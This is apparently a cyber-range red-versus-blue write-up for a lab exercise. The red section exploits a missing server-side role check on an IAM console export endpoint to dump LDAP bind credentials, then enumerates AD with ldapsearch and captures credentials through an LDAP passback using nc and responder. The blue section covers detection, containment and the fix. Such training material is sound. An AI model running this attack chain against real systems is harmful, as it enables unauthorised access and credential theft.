# GRIDFALL M5 Broken Access Control AD Pivot Red vs Blue Writeup

## Red Team Writeup

# Solve Guide â€” Red Team
## RNG-CLD-01 | M5 â€” cld-iam | Broken Access Control â†’ AD Integration Export
**Technique:** T1078.004 / T1199 â€” Cloud Accounts / Trusted Relationship Abuse  
**Pivot In:** cloud-iam-svc:IAm@CLD!2025 (from M4 image ENV)

## Objective
Authenticate to the PUL Cloud IAM Console as `cloud-iam-svc` (an `iam_user` role account), then exploit a Broken Access Control vulnerability to call the AD integration export API endpoint that is UI-restricted to admins but has no server-side role check â€” extracting LDAP bind credentials and DC information for the AD range pivot.

## Step 1 â€” Discover the IAM Console

```bash
nmap -sV -p 8080 11.0.2.50
# 8080/tcp  open  http  PUL Cloud IAM Console

# Curl version check
curl -s http://11.0.2.50:8080/api/v1/version
# {"service": "PUL Cloud IAM Console", "version": "3.1.0"}
```

<img width="1494" height="580" alt="image" src="https://github.com/user-attachments/assets/289cc07f-ab7a-4bf6-9fb7-7cad200e3030" />


Navigate to `http://11.0.2.50:8080` â€” the IAM Console login page.

<img width="2031" height="433" alt="image" src="https://github.com/user-attachments/assets/f157529e-9119-4264-bf36-7268dec9fcbd" />


## Step 2 â€” Authenticate with Stolen Credentials

```bash
# Login and capture the JWT token
TOKEN=$(curl -s -X POST http://11.0.2.50:8080/api/v1/login \
    -H "Content-Type: application/json" \
    -d '{"username":"cloud-iam-svc","password":"IAm@CLD!2025"}' \
    | python3 -c "import sys,json; print(json.load(sys.stdin).get('token',''))")

echo "Token: ${TOKEN}"
# Non-empty token confirms successful authentication
```

**Role check:** The JWT payload (base64 decoded middle segment) reveals:
```json
{"sub": "cloud-iam-svc", "role": "iam_user", "exp": ...}
```
Role is `iam_user` â€” not `iam_admin`. The UI will show restricted features.

<img width="2023" height="667" alt="image" src="https://github.com/user-attachments/assets/63e16eee-c88b-4e00-bd77-8b1cddcbb9c7" />


## Step 3 â€” Enumerate the API

Browse the authenticated dashboard at `http://11.0.2.50:8080/dashboard`. Navigate to **Integrations** â€” you see an AD integration tile with a ðŸ”’ padlock labeled "Admin only." The UI button is disabled for iam_user accounts.

However, the UI restriction is purely cosmetic JavaScript. The API itself has no server-side role enforcement on the export endpoint.

```bash
# Discover available API routes
curl -s -H "Authorization: Bearer ${TOKEN}" \
    http://11.0.2.50:8080/api/v1/integrations \
    | python3 -m json.tool
# Returns list of integrations including:
# {"id": "int-ad-corp-001", "name": "Corporate AD", "type": "ldap", "status": "active"}
```
<img width="1994" height="422" alt="image" src="https://github.com/user-attachments/assets/04d35866-b67d-4752-b6e3-70285d292a6c" />


## Step 4 â€” Exploit the Broken Access Control (THE GOAL)

The export endpoint should only be accessible to `iam_admin` role accounts. The server performs no role check:

```bash
# Direct API call â€” works for ANY authenticated user regardless of role
curl -s -H "Authorization: Bearer ${TOKEN}" \
    "http://11.0.2.50:8080/api/v1/integrations/int-ad-corp-001/export" \
    | python3 -m json.tool
```
<img width="1918" height="318" alt="image" src="https://github.com/user-attachments/assets/5c119998-4db0-4fe5-beb8-b7b95ea90a8b" />


Response:
```json
{
  "integration_id": "int-ad-corp-001",
  "type": "ldap",
  "config": {
    "dc_ip": "33.55.55.137",
    "domain": "cyberange.local",
    "bind_dn": "CN=svc_ldap,CN=Users,DC=cyberange,DC=local",
    "bind_password": "Ld@pB1nd#2025!",
    "base_dn": "DC=cyberange,DC=local",
    "ldap_port": 389,
    "use_ssl": false
  },
  "web_admin_panel": "http://33.55.55.129/admin/"
}
```
<img width="1393" height="891" alt="image" src="https://github.com/user-attachments/assets/9c29597a-c207-439a-a5ad-5cd16c83e11a" />


**Stolen LDAP credentials:**
- Bind DN: `CN=svc_ldap,CN=Users,DC=cyberange,DC=local`
- Bind Password: `Ld@pB1nd#2025!`
- Domain Controller: `33.55.55.137`
- Web admin panel: `http://33.55.55.129/admin/` (SRV08-WEB â€” AD range entry point)

## Step 5 â€” Pivot to AD Range via LDAP Passback

With `svc_ldap:Ld@pB1nd#2025!`, proceed to the AD range:

**A) Direct LDAP enumeration:**
```bash
ldapsearch -x -H ldap://33.55.55.137 \
    -D "CN=svc_ldap,CN=Users,DC=cyberange,DC=local" \
    -w 'Ld@pB1nd#2025!' \
    -b "DC=cyberange,DC=local" \
    "(objectClass=user)" sAMAccountName memberOf
```

**B) LDAP Passback via SRV08-WEB admin panel:**
1. Navigate to `http://33.55.55.129/admin/`
2. Login with `svc_ldap:Ld@pB1nd#2025!`
3. Go to LDAP settings â†’ change Server IP to your Kali IP
4. Start listener: `nc -lvnp 389` or `responder -I eth0`
5. Click "Test LDAP Connection" â†’ SRV08-WEB sends bind request â†’ credential captured

## Summary

| Item | Value |
|---|---|
| Vulnerability | Broken Access Control â€” no server-side role check on export endpoint |
| Endpoint | GET /api/v1/integrations/int-ad-corp-001/export |
| Stolen Creds | svc_ldap:Ld@pB1nd#2025! @ DC 33.55.55.137 |
| AD Entry Point | http://33.55.55.129/admin/ (SRV08-WEB LDAP Passback) |
| MITRE | T1078.004, T1199 |

---

## Blue Team Writeup

# Solve Guide â€” Blue Team
## RNG-CLD-01 | M5 â€” cld-iam | Broken Access Control Detection & Response

## Detection

### 1. Application Audit Log â€” API Access Anomaly

The IAM console logs all API calls with role information:

```bash
grep "API_CALL" /var/log/pul-cloud/iam.log | grep "int-ad-corp-001" | tail -20
```

A legitimate admin export looks like:
```
2024-11-15 11:20:00 [INFO] API_CALL|path=/api/v1/integrations/int-ad-corp-001/export|user=iam-admin|role=iam_admin|src=10.10.10.5|status=200
```

An attacker call looks like:
```
2024-11-15 11:42:17 [WARNING] API_CALL|path=/api/v1/integrations/int-ad-corp-001/export|user=cloud-iam-svc|role=iam_user|src=33.55.55.136|status=200
```

**Indicator:** `role=iam_user` accessing an admin-gated endpoint. This should be a 403 â€” a 200 means the access control is broken.

### 2. Detect the Broken Access Control Pattern

Enumerate all API calls where role=iam_user hit endpoints that return sensitive data:
```bash
grep "API_CALL" /var/log/pul-cloud/iam.log | \
    grep "role=iam_user" | \
    grep -E "/export|/credentials|/secrets|/config" | \
    grep "status=200"
```

Any results here indicate broken access control exploitation.

### 3. LDAP Passback Detection (on AD side)

Once `svc_ldap` credentials are used against SRV08-WEB and the attacker changes the LDAP server IP, the Domain Controller logs a failed bind from SRV08-WEB's IP to an external address. Monitor DC Security Event ID 4625 (failed logon) with source IPs outside the AD zone. Also monitor SRV08-WEB IIS logs for POST requests to the LDAP settings page from unexpected source IPs.

## Containment

```bash
# 1. Revoke the cloud-iam-svc JWT (rotate the JWT secret to invalidate all tokens)
# In /opt/pul-cloud-iam/app.py, change JWT_SECRET to a new random value
JWT_SECRET=$(python3 -c "import secrets; print(secrets.token_hex(32))")
sed -i "s/JWT_SECRET = .*/JWT_SECRET = \"${JWT_SECRET}\"/" /opt/pul-cloud-iam/app.py
systemctl restart pul-cloud-iam

# 2. Change cloud-iam-svc password immediately
# Edit USERS dict in app.py and update password hash
# Also rebuild M4 platform-svc image without hardcoded CLOUD_IAM_PASS

# 3. Rotate svc_ldap password in AD immediately
# (On DC) net user svc_ldap NewLdapB1nd#2025! /domain
# Then update bind_password in M5 IAM config

# 4. Force-expire all active sessions:
systemctl restart pul-cloud-iam
```

## Remediation â€” Fix the Broken Access Control

The root cause is in `/opt/pul-cloud-iam/app.py` at the `/api/v1/integrations/<id>/export` route. The route is decorated with `@login_required` (checks JWT is valid) but NOT with `@admin_required` (checks role=iam_admin):

```python
# VULNERABLE (current):
@app.route("/api/v1/integrations/<integration_id>/export")
@login_required          # Only checks: is token valid?
def export_integration(integration_id):
    return jsonify(AD_INTEGRATION[integration_id])  # No role check

# FIXED:
@app.route("/api/v1/integrations/<integration_id>/export")
@login_required
@admin_required          # Checks: role == 'iam_admin'
def export_integration(integration_id):
    return jsonify(AD_INTEGRATION[integration_id])
```

Additional hardening:
1. Add rate limiting on sensitive API endpoints (`flask-limiter`)
2. Log and alert on any 403 â†’ 200 role escalation patterns
3. Implement API response filtering â€” never return `bind_password` in plaintext; reference a secrets manager path instead
4. Conduct a full API authorization review (OWASP API Security â€” API1:2023 Broken Object Level Authorization, API5:2023 Broken Function Level Authorization)
5. Store AD bind credentials in Vault, not in app config files

## Blue Team Checklist
- [ ] Unauthorized export API call confirmed in IAM audit log (role=iam_user, status=200)
- [ ] Source IP and user account identified
- [ ] JWT secret rotated â†’ all active sessions invalidated
- [ ] cloud-iam-svc password changed (+ M4 image rebuilt)
- [ ] svc_ldap password rotated in AD + M5 config updated
- [ ] @admin_required decorator added to export endpoint
- [ ] SRV08-WEB LDAP config checked for tampered server IP
- [ ] DC audit logs reviewed for unauthorized LDAP activity
- [ ] Full API authorization audit initiated

